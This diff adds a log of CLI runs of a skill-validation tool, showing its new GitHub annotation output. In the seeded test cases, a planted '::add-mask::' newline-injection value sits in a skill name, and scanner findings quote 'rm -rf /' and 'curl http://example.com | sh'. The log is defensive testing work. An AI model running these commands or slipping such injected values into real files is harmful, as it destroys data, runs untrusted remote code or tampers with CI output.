@@ -1,0 +1,325 @@
+# commands.log — real CLI capture for GitHub annotations report
+# platform: Linux 6.12.113+ x86_64
+# python: Python 3.13.18
+# evaluator: skillevaluator, version 1.0.1
+
+===== BEFORE (untouched upstream tip affe1acc) =====
+$ uv run skillevaluator validate /tmp/github-annot-demo/seeded --tiers 1 --checks schema,quality,pii,lint --no-llm -r github --no-autopilot --no-dedup
+Usage: skillevaluator validate [OPTIONS] TARGET_PATH
+Try 'skillevaluator validate --help' for help.
+
+Error: Invalid value for '-r' / '--report': 'github' is not one of 'cli', 'json', 'html', 'markdown', 'sarif', 'junit'.
+EXIT:2
+
+===== AFTER: seeded failures (schema, quality, pii, lint) =====
+$ uv run skillevaluator validate /tmp/github-annot-demo/seeded --tiers 1 --checks schema,quality,pii,lint --no-llm -r cli,github --no-autopilot --no-dedup
+╭──────────────────────────────────────────────────────────────────────────────╮
+│  skillevaluator validate                                     skill: seeded   │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+[00:00:00] Tier 1: running
+[00:00:00] Tier 1/checks: running - schema
+[00:00:00] Tier 1/checks: running - pii
+[00:00:00] Tier 1/checks: running - quality
+[00:00:00] Tier 1/checks: running - lint
+[00:00:00] Tier 1/checks: failed
+[00:00:00] Tier 1: failed
+╭─ Tier 1 · Static & Security ─────────────────────────────────────────────────╮
+│    checks      ✗ schema · ✓ pii · ✗ quality · ✓ lint                         │
+│    summary     2/4 checks passed (4 sub-checks)  ·  2 failed  ·              │
+│                12 warnings                                                   │
+│    advisories  2  lint 2                                                     │
+│    quality     D  68.8 / 100                                                 │
+│                                                                              │
+│    what to fix ────────────────────────────────────────────────────────────  │
+│  1 schema      Field 'name': Value error, Skill name 'Seeded Failures' must  │
+│                be in kebab-case format (lowercase letters, numbers, and      │
+│                hyphens only, starting with a letter)                         │
+│                → Fix the 'name' field in frontmatter according to schema     │
+│                  requirements                                                │
+│  2 quality     Quality score 68.8/100 is below the required 70/100 in        │
+│                /tmp/github-annot-demo/seeded/SKILL.md                        │
+╰────────────────────────────────────────────────────────────── ✗ fail · 0.0s ─╯
+                 SkillEvaluator Validation Results                 
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Validator                      ┃ Status ┃ Details               ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━┩
+│ Schema & Repository Governance │  FAIL  │ 1 errors              │
+│ PII Scan                       │  PASS  │ 2 checks passed       │
+│ QUALITY                        │  FAIL  │ 2 errors, 12 warnings │
+│ SCRIPT_LINT                    │  PASS  │ OK                    │
+└────────────────────────────────┴────────┴───────────────────────┘
+
+╭─────────────────╮
+│ Failure Details │
+╰─────────────────╯
+
+[Schema & Repository Governance]
+Validate SKILL.md frontmatter and repository structure
+[FAIL] Validation failed
+
+Summary:
+  • Checks performed: 1
+  • Errors: 1 (1 high)
+
+Issues:
+  1. [SCHEMA-HIGH] Field 'name': Value error, Skill name 'Seeded Failures' must 
+be in kebab-case format (lowercase letters, numbers, and hyphens only, starting 
+with a letter)
+     File:    /tmp/github-annot-demo/seeded/SKILL.md
+     Check:   frontmatter_field
+     Fix:     Fix the 'name' field in frontmatter according to schema 
+requirements
+
+
+[QUALITY]
+Skill quality scoring across Correctness (35%), Discoverability (25%), 
+Reliability (25%), and Efficiency (15%)
+
+  Overall: 68.8/100 (Grade: D)
+  Skill Type: script-based
+
+                            Quality Scores by Skill                             
+┏━━━━━━━━┳━━━━━━━┳━━━━━━━┳━━━━━━━━━━━━━┳━━━━━━━━━━━━━┳━━━━━━━━━━━━┳━━━━━━━━━━━━┓
+┃ Skill  ┃ Grade ┃ Score ┃ Correctness ┃ Discoverab… ┃ Reliabili… ┃ Efficiency ┃
+┡━━━━━━━━╇━━━━━━━╇━━━━━━━╇━━━━━━━━━━━━━╇━━━━━━━━━━━━━╇━━━━━━━━━━━━╇━━━━━━━━━━━━┩
+│ seeded │   D   │  68.8 │          50 │          65 │         80 │        100 │
+└────────┴───────┴───────┴─────────────┴─────────────┴────────────┴────────────┘
+
+[FAIL] Validation failed
+
+Summary:
+  • Checks performed: 1
+  • Errors: 2 (1 high)
+  • Warnings: 12
+
+Errors:
+  • Quality score 68.8/100 is below the required 70/100 in 
+/tmp/github-annot-demo/seeded/SKILL.md
+
+Issues:
+  1. [QUALITY-HIGH] Invalid name format: 'Seeded Failures' 
+(lowercase/numbers/hyphens only)
+     File:    /tmp/github-annot-demo/seeded/SKILL.md
+     Check:   quality_correctness
+     Fix:     Use only lowercase letters, numbers, and hyphens
+
+  2. [QUALITY-MEDIUM] No documented scripts in table format
+     File:    /tmp/github-annot-demo/seeded/SKILL.md
+     Check:   quality_correctness
+     Fix:     Add '## Available Scripts' with table: | Script | Purpose | 
+Arguments |
+
+  3. [QUALITY-MEDIUM] Instructions don't mention 'run_script'
+     File:    /tmp/github-annot-demo/seeded/SKILL.md
+     Check:   quality_correctness
+     Fix:     Add explicit run_script() call examples
+
+  4. [QUALITY-LOW] No examples provided
+     File:    /tmp/github-annot-demo/seeded/SKILL.md
+     Check:   quality_correctness
+     Fix:     Add example usage with code blocks
+
+  5. [QUALITY-MEDIUM] SKILL_SPEC recommended field missing: 'metadata.author'
+     File:    /tmp/github-annot-demo/seeded/SKILL.md
+     Check:   quality_correctness
+     Fix:     Add 'author' under metadata: — Author name or team (under 
+metadata:)
+
+  6. [QUALITY-MEDIUM] SKILL_SPEC recommended field missing: 'metadata.tags'
+     File:    /tmp/github-annot-demo/seeded/SKILL.md
+     Check:   quality_correctness
+     Fix:     Add 'tags' under metadata: — Categorization tags (under metadata:,
+list of 1-5 items)
+
+  7. [QUALITY-MEDIUM] Description too short (recommend 50-150 chars): 1 chars, 
+minimum 20
+     File:    /tmp/github-annot-demo/seeded/SKILL.md
+     Check:   quality_discoverability
+     Fix:     Add more context: what tasks does this skill handle?
+
+  8. [QUALITY-LOW] Description doesn't mention WHEN to use this skill
+     File:    /tmp/github-annot-demo/seeded/SKILL.md
+     Check:   quality_discoverability
+     Fix:     Add trigger context: 'Use for...', 'When you need to...'
+
+  9. [QUALITY-LOW] No '## Purpose' section
+     File:    /tmp/github-annot-demo/seeded/SKILL.md
+     Check:   quality_discoverability
+     Fix:     Add purpose section to clarify use cases
+
+  10. [QUALITY-LOW] Scripts may lack error handling: run.py
+     File:    /tmp/github-annot-demo/seeded/SKILL.md
+     Check:   quality_reliability
+     Fix:     Scripts should handle errors explicitly
+
+  11. [QUALITY-LOW] No prerequisites/requirements documented
+     File:    /tmp/github-annot-demo/seeded/SKILL.md
+     Check:   quality_reliability
+     Fix:     Document dependencies, API keys, or setup needed
+
+  12. [QUALITY-LOW] No limitations documented
+     File:    /tmp/github-annot-demo/seeded/SKILL.md
+     Check:   quality_reliability
+     Fix:     Add '## Limitations' section with known issues/constraints
+
+  13. [QUALITY-LOW] No troubleshooting section documented
+     File:    /tmp/github-annot-demo/seeded/SKILL.md
+     Check:   quality_reliability
+     Fix:     Add '## Troubleshooting' with Error/Cause/Solution patterns
+
+╭───────────────────────╮
+│ Non-blocking Findings │
+╰───────────────────────╯
+
+[SCRIPT_LINT]
+AST-based code quality checks for skill scripts
+[PASS] Validation passed
+
+Summary:
+
+Issues:
+  1. [SCRIPT_LINT-MEDIUM] run.py has no function definitions (flat script)
+     File:    /tmp/github-annot-demo/seeded/scripts/run.py
+     Check:   flat_script
+     Fix:     Wrap logic in functions for maintainability and testability
+
+  2. [SCRIPT_LINT-LOW] run.py may lack input validation
+     File:    /tmp/github-annot-demo/seeded/scripts/run.py
+     Check:   no_input_validation
+     Fix:     Add argument checks and raise descriptive errors
+
+
+[FAIL] Changes required
+Tier 1: 2 of 4 checks passed; 2 failed, 0 incomplete, 0 skipped, 0 N/A
+Tier 2: Not run (not requested)
+Tier 3: Not run (not requested)
+Publication eligibility: Not eligible
+
+::error title=QUALITY/gate_failure::Quality score 68.8/100 is below the required 70/100 in /tmp/github-annot-demo/seeded/SKILL.md
+::error title=Schema & Repository Governance/frontmatter_field,file=SKILL.md::Field 'name': Value error, Skill name 'Seeded Failures' must be in kebab-case format (lowercase letters, numbers, and hyphens only, starting with a letter) Suggestion: Fix the 'name' field in frontmatter according to schema requirements
+::error title=QUALITY/quality_correctness,file=SKILL.md::Invalid name format: 'Seeded Failures' (lowercase/numbers/hyphens only) Suggestion: Use only lowercase letters, numbers, and hyphens
+::warning title=QUALITY/quality_correctness,file=SKILL.md::Instructions don't mention 'run_script' Suggestion: Add explicit run_script() call examples
+::warning title=QUALITY/quality_correctness,file=SKILL.md::No documented scripts in table format Suggestion: Add '## Available Scripts' with table: | Script | Purpose | Arguments |
+::warning title=QUALITY/quality_correctness,file=SKILL.md::SKILL_SPEC recommended field missing: 'metadata.author' Suggestion: Add 'author' under metadata: — Author name or team (under metadata:)
+::warning title=QUALITY/quality_correctness,file=SKILL.md::SKILL_SPEC recommended field missing: 'metadata.tags' Suggestion: Add 'tags' under metadata: — Categorization tags (under metadata:, list of 1-5 items)
+::warning title=QUALITY/quality_discoverability,file=SKILL.md::Description too short (recommend 50-150 chars): 1 chars, minimum 20 Suggestion: Add more context: what tasks does this skill handle?
+::warning title=SCRIPT_LINT/flat_script,file=scripts/run.py::run.py has no function definitions (flat script) Suggestion: Wrap logic in functions for maintainability and testability
+::warning title=QUALITY/quality_correctness,file=SKILL.md::No examples provided Suggestion: Add example usage with code blocks
+::warning title=QUALITY/quality_discoverability,file=SKILL.md::Description doesn't mention WHEN to use this skill Suggestion: Add trigger context: 'Use for...', 'When you need to...'
+::warning title=QUALITY/quality_discoverability,file=SKILL.md::No '## Purpose' section Suggestion: Add purpose section to clarify use cases
+::warning title=QUALITY/quality_reliability,file=SKILL.md::No limitations documented Suggestion: Add '## Limitations' section with known issues/constraints
+::notice title=SkillEvaluator::1 skill checked, 0 passed, 1 failed, 0 incomplete. 4 more were not annotated (GitHub limits 10 errors and 10 warnings per step); see the other reports
+╭──────────────────────────────────────────────────────────────────────────────╮
+│   ✗ FAIL   Changes required: Tier 1: 2 failed  ·  exit 1                     │
+│  Tier 1: 2 of 4 checks passed; 2 failed, 0 incomplete, 0 skipped, 0 N/A      │
+│  Tier 2: Not run (not requested)                                             │
+│  Tier 3: Not run (not requested)                                             │
+│  Publication eligibility: Not eligible                                       │
+│                                                                              │
+│  fix     see what to fix above, then rerun                                   │
+│          skillevaluator validate /tmp/github-annot-demo/seeded --tiers 1     │
+│  --checks schema,quality,pii,lint --no-llm -r cli,github --no-autopilot      │
+│  --no-dedup -o /tmp/github-annot-demo/after/seeded-reports                   │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+Error: validation failed
+EXIT:1
+
+===== AFTER: planted ::add-mask / newline payload =====
+$ uv run skillevaluator validate /tmp/github-annot-demo/payload --tiers 1 --checks schema --no-llm -r github --no-autopilot --no-dedup
+╭──────────────────────────────────────────────────────────────────────────────╮
+│  skillevaluator validate                                    skill: payload   │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+[00:00:00] Tier 1: running
+[00:00:00] Tier 1/checks: running - schema
+[00:00:00] Tier 1/checks: failed
+[00:00:00] Tier 1: failed
+╭─ Tier 1 · Static & Security ─────────────────────────────────────────────────╮
+│    checks      ✗ schema                                                      │
+│    summary     0/1 checks passed (1 sub-checks)  ·  1 failed                 │
+│                                                                              │
+│    what to fix ────────────────────────────────────────────────────────────  │
+│  1 schema      Field 'name': Value error, Skill name 'ok                     │
+│                ::add-mask::planted-secret and ::stop-commands::tok' must be  │
+│                in kebab-case format (lowercase letters, numbers, and         │
+│                hyphens only, starting with a letter)                         │
+│                → Fix the 'name' field in frontmatter according to schema     │
+│                  requirements                                                │
+╰────────────────────────────────────────────────────────────── ✗ fail · 0.0s ─╯
+::error title=Schema & Repository Governance/frontmatter_field,file=SKILL.md::Field 'name': Value error, Skill name 'ok%0A::add-mask::planted-secret and ::stop-commands::tok' must be in kebab-case format (lowercase letters, numbers, and hyphens only, starting with a letter) Suggestion: Fix the 'name' field in frontmatter according to schema requirements
+::notice title=SkillEvaluator::1 skill checked, 0 passed, 1 failed, 0 incomplete
+╭──────────────────────────────────────────────────────────────────────────────╮
+│   ✗ FAIL   Changes required: Schema & Repository Governance failed in Tier   │
+│  1  ·  exit 1                                                                │
+│  Tier 1: 0 of 1 checks passed; 1 failed, 0 incomplete, 0 skipped, 0 N/A      │
+│  Tier 2: Not run (not requested)                                             │
+│  Tier 3: Not run (not requested)                                             │
+│  Publication eligibility: Not eligible                                       │
+│                                                                              │
+│  fix     see what to fix above, then rerun                                   │
+│          skillevaluator validate /tmp/github-annot-demo/payload --tiers 1    │
+│  --checks schema --no-llm --no-autopilot --no-dedup -r github -o             │
+│  /tmp/github-annot-demo/after/payload-reports                                │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+Error: validation failed
+EXIT:1
+
+===== AFTER: more than 10 errors (cap) =====
+$ uv run skillevaluator validate /tmp/github-annot-demo/many --tiers 1 --checks security --no-llm -r github --no-autopilot --no-dedup
+╭──────────────────────────────────────────────────────────────────────────────╮
+│  skillevaluator validate                                       skill: many   │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+[00:00:00] Tier 1: running
+[00:00:00] Tier 1/checks: running - security
+[00:00:02] Tier 1/checks: failed
+[00:00:02] Tier 1: failed
+╭─ Tier 1 · Static & Security ─────────────────────────────────────────────────╮
+│    checks      ✗ security                                                    │
+│    scanners    SkillSpector 2.13.4, scan incomplete                          │
+│    summary     0/1 checks passed  ·  1 failed  ·  1 warning                  │
+│                                                                              │
+│    what to fix ────────────────────────────────────────────────────────────  │
+│  1 security    skillspector JSON field 'analysis_completeness' reports       │
+│                incomplete analysis (status 'partial'): scripts/bad_1.sh      │
+│                [static; static_parse_limit;                                  │
+│                analyzers=static_patterns_tool_misuse]; scripts/bad_10.sh     │
+│                [static; static_parse_limit;                                  │
+│                analyzers=static_patterns_tool_misuse]; scripts/bad_11.sh     │
+│                [static; static_parse_limit;                                  │
+│                analyzers=static_patterns_tool_misuse]; and 13 more           │
+│                (incomplete files by reason: static_parse_limit 16);          │
+│                security scan did not complete                                │
+╰────────────────────────────────────────────────────────────── ✗ fail · 2.4s ─╯
+::error title=Security Scan/gate_failure::skillspector JSON field 'analysis_completeness' reports incomplete analysis (status 'partial'): scripts/bad_1.sh [static; static_parse_limit; analyzers=static_patterns_tool_misuse]; scripts/bad_10.sh [static; static_parse_limit; analyzers=static_patterns_tool_misuse]; scripts/bad_11.sh [static; static_parse_limit; analyzers=static_patterns_tool_misuse]; and 13 more (incomplete files by reason: static_parse_limit 16); security scan did not complete
+::error title=Security Scan/Tool Parameter Abuse (TM1),file=scripts/bad_1.sh,line=3::Tool Misuse: rm -rf / Suggestion: Tool parameters are crafted to achieve unintended or unsafe behavior. Parameter abuse can bypass intended safety checks (e.g. shell=True, --force, dangerous glob patterns). Validate all tool parameters against an allowlist. Reject dangerous parameter values (shell=True, --force, -rf /) and use safe defaults.
+::error title=Security Scan/YARA rule 'agent_skill_destructive_autonomous_actions'%3A Autonomous destructive filesystem%2C shell history%2C or repository actions in AI agent skills [agent_skills] (YR1),file=scripts/bad_1.sh,line=3::YARA Match: rm -rf /%0A Suggestion: YARA rule matched a known malware signature (reverse shell, backdoor, ransomware, C2 framework, or info stealer). Remove the malware payload or compromised file entirely. Investigate how it entered the skill and audit all other artifacts for additional indicators of compromise.
+::error title=Security Scan/Chaining Abuse (TM2),file=scripts/bad_1.sh,line=4::Tool Misuse: | sh%0A Suggestion: Tool calls are chained to bypass individual safety checks or escalate capabilities beyond what any single tool call would allow. Limit tool chaining depth and validate the output of each tool before passing it to the next. Require explicit user approval for multi-step chains.
+::error title=Security Scan/External Script Fetching (SC2),file=scripts/bad_1.sh,line=4::Supply Chain: curl http://example.com | sh Suggestion: Remote code is downloaded and executed. This bypasses code review and could introduce malicious code. Avoid downloading and executing remote scripts. Use trusted packages from PyPI/npm. If remote fetch is required, verify checksums and use HTTPS.
+::error title=Security Scan/Tool Parameter Abuse (TM1),file=scripts/bad_10.sh,line=3::Tool Misuse: rm -rf / Suggestion: Tool parameters are crafted to achieve unintended or unsafe behavior. Parameter abuse can bypass intended safety checks (e.g. shell=True, --force, dangerous glob patterns). Validate all tool parameters against an allowlist. Reject dangerous parameter values (shell=True, --force, -rf /) and use safe defaults.
+::error title=Security Scan/YARA rule 'agent_skill_destructive_autonomous_actions'%3A Autonomous destructive filesystem%2C shell history%2C or repository actions in AI agent skills [agent_skills] (YR1),file=scripts/bad_10.sh,line=3::YARA Match: rm -rf /%0A Suggestion: YARA rule matched a known malware signature (reverse shell, backdoor, ransomware, C2 framework, or info stealer). Remove the malware payload or compromised file entirely. Investigate how it entered the skill and audit all other artifacts for additional indicators of compromise.
+::error title=Security Scan/Chaining Abuse (TM2),file=scripts/bad_10.sh,line=4::Tool Misuse: | sh%0A Suggestion: Tool calls are chained to bypass individual safety checks or escalate capabilities beyond what any single tool call would allow. Limit tool chaining depth and validate the output of each tool before passing it to the next. Require explicit user approval for multi-step chains.
+::error title=Security Scan/External Script Fetching (SC2),file=scripts/bad_10.sh,line=4::Supply Chain: curl http://example.com | sh Suggestion: Remote code is downloaded and executed. This bypasses code review and could introduce malicious code. Avoid downloading and executing remote scripts. Use trusted packages from PyPI/npm. If remote fetch is required, verify checksums and use HTTPS.
+::error title=Security Scan/Tool Parameter Abuse (TM1),file=scripts/bad_11.sh,line=3::Tool Misuse: rm -rf / Suggestion: Tool parameters are crafted to achieve unintended or unsafe behavior. Parameter abuse can bypass intended safety checks (e.g. shell=True, --force, dangerous glob patterns). Validate all tool parameters against an allowlist. Reject dangerous parameter values (shell=True, --force, -rf /) and use safe defaults.
+::warning title=Security Scan/incomplete/skillspector::skillspector JSON field 'analysis_completeness' reports incomplete analysis (status 'partial'): scripts/bad_1.sh [static; static_parse_limit; analyzers=static_patterns_tool_misuse]; scripts/bad_10.sh [static; static_parse_limit; analyzers=static_patterns_tool_misuse]; scripts/bad_11.sh [static; static_parse_limit; analyzers=static_patterns_tool_misuse]; and 13 more (incomplete files by reason: static_parse_limit 16); security scan did not complete
+::warning title=Security Scan/Unknown (LP3),file=SKILL.md,line=1::MCP Least Privilege: Without declared permissions the skill's intent is opaque and cannot be validated. Suggestion: Without declared permissions the skill's intent is opaque and cannot be validated. Declare the skill's tool scope: for Claude Code / Agent Skills SKILL.md, list the tools the skill may invoke in the 'allowed-tools' frontmatter field; for MCP server manifests, add a 'permissions' list naming the required capabilities.
+::notice title=SkillEvaluator::1 skill checked, 0 passed, 1 failed, 0 incomplete. 55 more were not annotated (GitHub limits 10 errors and 10 warnings per step); see the other reports
+╭──────────────────────────────────────────────────────────────────────────────╮
+│   ✗ FAIL   Changes required: Security Scan was incomplete in Tier 1  ·       │
+│  exit 1                                                                      │
+│  Tier 1: 0 of 1 checks passed; 1 failed, 0 incomplete, 0 skipped, 0 N/A      │
+│  Tier 2: Not run (not requested)                                             │
+│  Tier 3: Not run (not requested)                                             │
+│  Publication eligibility: Incomplete                                         │
+│                                                                              │
+│  fix     see what to fix above, then rerun                                   │
+│          skillevaluator validate /tmp/github-annot-demo/many --tiers 1       │
+│  --checks security --no-llm --no-autopilot --no-dedup -r github -o           │
+│  /tmp/github-annot-demo/after/many-reports                                   │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+Error: validation failed
+EXIT:1
